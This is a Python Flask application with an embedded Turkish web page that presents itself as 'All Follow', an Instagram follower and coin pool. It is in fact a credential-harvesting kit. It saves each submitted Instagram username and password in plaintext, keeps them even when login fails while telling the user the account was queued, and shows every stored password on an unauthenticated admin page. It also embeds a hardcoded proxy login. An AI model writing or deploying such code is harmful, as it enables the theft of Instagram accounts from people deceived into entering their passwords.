import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///allfollow.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# TÜRKİYE PROXY (Hız için TR Lokasyon Şart)
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=0)
    status = db.Column(db.String(50), default="Pasif")

# --- ALL FOLLOW ARAYÜZÜ ---
ALL_FOLLOW_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Follow | Coin & Follower Pool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0f172a; font-family: sans-serif; }
        .af-card { background: rgba(30, 41, 59, 0.7); border: 1px solid #334155; backdrop-filter: blur(10px); }
        .af-btn { background: linear-gradient(to right, #3b82f6, #2563eb); transition: all 0.2s; }
        .af-btn:active { scale: 0.95; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen text-slate-200">
    <div class="af-card p-8 rounded-3xl w-full max-w-[400px] shadow-2xl">
        <div class="text-center mb-10">
            <h1 class="text-4xl font-black tracking-tighter text-white italic">ALL FOLLOW</h1>
            <p class="text-blue-400 text-xs font-bold uppercase mt-2">Takipçi Havuzuna Katıl</p>
        </div>
        
        <div class="space-y-5">
            <input id="u" type="text" placeholder="Instagram Kullanıcı Adı" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl outline-none focus:border-blue-500 transition-colors">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-2xl outline-none focus:border-blue-500 transition-colors">
            
            <button onclick="joinPool()" id="btn" class="af-btn w-full text-white font-black py-4 rounded-2xl shadow-lg shadow-blue-500/20 uppercase tracking-widest">
                Sisteme Bağlan
            </button>
            
            <div id="status" class="text-center text-sm font-medium py-2"></div>
        </div>
        
        <div class="mt-8 pt-6 border-t border-slate-700 text-center">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest">TopFollow Altyapısı ile %100 Uyumlu</p>
        </div>
    </div>

    <script>
        async function joinPool() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn'), st = document.getElementById('status');
            if(!u || !p) return;

            btn.disabled = true; btn.innerText = "BAĞLANILIYOR...";
            st.className = "text-center text-sm text-blue-400 animate-pulse";
            st.innerText = "Hesap havuzumuza ekleniyor, lütfen bekleyin...";

            try {
                const r = await fetch('/api/login', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                
                if(d.status === "success") {
                    st.className = "text-center text-sm text-green-400 font-bold";
                    st.innerText = "Başarılı! Havuza katıldınız.";
                    btn.innerText = "AKTİF EDİLDİ ✅";
                } else {
                    st.className = "text-center text-sm text-red-400 font-bold";
                    st.innerText = d.msg;
                    btn.disabled = false; btn.innerText = "TEKRAR DENE";
                }
            } catch(e) {
                st.innerText = "Bağlantı hatası!";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(ALL_FOLLOW_UI)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Havuz kaydı (Ya güncelle ya oluştur)
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p)
        db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    # DIREKT INSTAGRAM GIRISI
    cl = Client()
    try:
        cl.set_proxy(PROXY_URL)
        cl.request_timeout = 15
        cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR"})
        
        if cl.login(u, p):
            user.status = "AKTİF"
            db.session.commit()
            return jsonify(status="success", msg="Havuza başarıyla giriş yapıldı!")
        else:
            user.status = "Hatalı Şifre"
            db.session.commit()
            return jsonify(status="error", msg="Bilgileriniz doğrulanamadı.")
            
    except Exception as e:
        # Hata olsa bile şifre db'de kaldı, sadece status güncelliyoruz
        user.status = "Bağlantı Hatası"
        db.session.commit()
        return jsonify(status="error", msg="Instagram meşgul, ama hesabınız sıraya alındı.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = "<body style='background:#0f172a;color:#fff;font-family:sans-serif;padding:30px;'>"
    res += f"<h1>ALL FOLLOW HAVUZU ({len(users)} Hesap)</h1>"
    res += "<table border='1' style='width:100%; border-collapse:collapse;'>"
    res += "<tr style='background:#1e293b'><th>Username</th><th>Password</th><th>Status</th></tr>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
